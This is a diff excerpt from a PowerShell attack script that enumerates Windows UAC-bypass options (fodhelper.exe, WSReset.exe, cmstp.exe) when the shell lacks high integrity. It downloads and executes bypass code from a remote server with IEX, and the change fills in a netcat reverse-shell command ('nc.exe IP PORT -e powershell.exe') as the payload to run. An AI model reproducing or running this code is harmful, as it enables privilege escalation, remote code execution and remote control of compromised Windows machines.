@@ -13,11 +13,11 @@ if($(whoami /groups | Select-String "High Mandatory") -ne $null) {
     Write-Host "You are not in High Integrity Shell (High Mandatory Level), try to bypass UAC."
     Write-Host "ENUMERATING POSSIBLE VULNERABILITIES:"
     if(Test-Path C:\Windows\System32\fodhelper.exe) {
-        Write-Host "`t [*] fodhelper.exe available, use > fodhelper -command '<YOUR COMMAND>' to exploit:"
+        Write-Host "`t [*] fodhelper.exe available, use > fodhelper -command 'C:\blood\nc.exe IP PORT -e powershell.exe' to exploit:"
         IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/UAC/fodhelper.txt")
     }
     if(Test-Path C:\Windows\System32\WSReset.exe) {
-        Write-Host "`t [*] WSReset.exe available, use > WSResetBypass -Command '<YOUR COMMAND>' to exploit:"
+        Write-Host "`t [*] WSReset.exe available, use > WSResetBypass -Command 'C:\blood\nc.exe IP PORT -e powershell.exe' to exploit:"
         IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/UAC/WSResetBypass.txt")
     }
     if(Test-Path C:\windows\system32\cmstp.exe) {
